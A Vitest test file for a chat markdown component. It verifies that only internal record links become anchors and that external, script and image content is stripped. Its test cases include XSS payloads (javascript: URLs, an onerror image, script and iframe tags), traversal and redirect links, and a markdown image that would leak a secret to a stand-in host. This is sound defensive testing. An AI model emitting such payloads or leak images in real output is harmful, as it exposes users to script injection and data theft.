import { describe, expect, it } from "vitest"
import { renderToStaticMarkup } from "react-dom/server"
import { MemoryRouter } from "react-router-dom"
import { ChatLink, ChatMarkdown, chatUrlTransform } from "@/components/chat/ChatMarkdown"

const ID = "3f2b8c1e-4d5a-4b6c-8d7e-9f0a1b2c3d4e"

function render(md: string): string {
  return renderToStaticMarkup(<MemoryRouter><ChatMarkdown content={md} /></MemoryRouter>)
}

describe("ChatMarkdown — the second layer behind the server sanitiser", () => {
  it("renders ordinary markdown (the renderer is live, so the absences below mean something)", () => {
    const html = render("Some **bold**, `code` and a list:\n\n- one\n- two")
    expect(html).toContain("<strong>bold</strong>")
    expect(html).toContain("<code")
    expect(html).toContain("<li>one</li>")
  })

  it("links a record page by id", () => {
    for (const kind of ["assets", "findings", "organizations/entity"]) {
      const html = render(`See [the record](/${kind}/${ID}).`)
      expect(html).toMatch(new RegExp(`<a [^>]*href="/${kind}/${ID}"`))
      expect(html).toContain(">the record</a>")
    }
  })

  it.each([
    ["an external link", "[click](https://evil.example/x)", "click"],
    ["an angle autolink", "<https://evil.example/x>", "evil.example"],
    ["a www. literal", "visit www.evil.example now", "www.evil.example"],
    ["a bare URL literal", "visit https://evil.example/x now", "evil.example"],
    ["javascript:", "[go](javascript:alert(1))", "go"],
    ["a data: URL", "[go](data:text/html,hi)", "go"],
    ["a protocol-relative URL", "[go](//evil.example/assets/x)", "go"],
    ["a non-record app path", "[users](/admin/users)", "users"],
    ["a record path with a suffix", `[x](/assets/${ID}?next=https://evil.example)`, "x"],
    ["a record path with traversal", `[x](/assets/../admin/${ID})`, "x"],
    ["a reference-style link", "[x][r]\n\n[r]: https://evil.example", "x"],
    ["a footnote", "claim[^1]\n\n[^1]: https://evil.example", "claim"],
  ])("renders %s as text, not a link", (_name, md, text) => {
    const html = render(md)
    expect(html).toContain(text)  // reached: the content is there…
    expect(html).not.toContain("<a ")  // …but not as a link
    expect(html).not.toMatch(/href=/)
  })

  it.each([
    ["raw <img> with onerror", "hi <img src=x onerror=alert(1)> there"],
    ["raw <script>", "<script>alert(1)</script>\n\nhi there"],
    ["raw <a>", 'hi <a href="https://evil.example">there</a>'],
    ["raw <iframe>", "hi <iframe src=https://evil.example></iframe> there"],
  ])("never turns %s into an element", (_name, md) => {
    const html = render(md)
    expect(html).toContain("hi")
    expect(html).not.toMatch(/<(img|script|a|iframe)\b/i)
    expect(html).not.toMatch(/onerror|href=/i)
  })

  it("drops images, keeping no URL", () => {
    const html = render("before ![leak](https://evil.example/p.png?d=secret) after")
    expect(html).toContain("before")
    expect(html).toContain("after")
    expect(html).not.toContain("<img")
    expect(html).not.toContain("evil.example")
  })

  it("renders a GFM table", () => {
    const html = render("| a | b |\n|---|---|\n| 1 | 2 |")
    expect(html).toContain("<table")
    expect(html).toContain("<td")
  })
})

// Each link layer on its own: either one alone must hold, so neither test
// leans on the other (the rendering tests above exercise both together).
describe("link layers, separately", () => {
  it("urlTransform keeps only record URLs", () => {
    expect(chatUrlTransform(`/assets/${ID}`)).toBe(`/assets/${ID}`)
    for (const u of ["https://evil.example/x", "javascript:alert(1)", "//evil.example", "/admin/users", "#fn-1"]) {
      expect(chatUrlTransform(u)).toBe("")
    }
  })
  it("ChatLink renders a link only for a record URL", () => {
    const ok = renderToStaticMarkup(<MemoryRouter><ChatLink href={`/findings/${ID}`}>f</ChatLink></MemoryRouter>)
    expect(ok).toMatch(new RegExp(`<a [^>]*href="/findings/${ID}"`))
    for (const u of ["https://evil.example/x", "javascript:alert(1)", "/admin/users", undefined]) {
      const html = renderToStaticMarkup(<MemoryRouter><ChatLink href={u}>t</ChatLink></MemoryRouter>)
      expect(html).toBe("<span>t</span>")
    }
  })
})
